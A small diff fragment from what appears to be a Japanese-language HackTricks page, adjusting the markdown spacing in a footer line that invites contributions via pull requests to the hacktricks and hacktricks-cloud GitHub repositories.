-* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**
+* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
 
 </details>
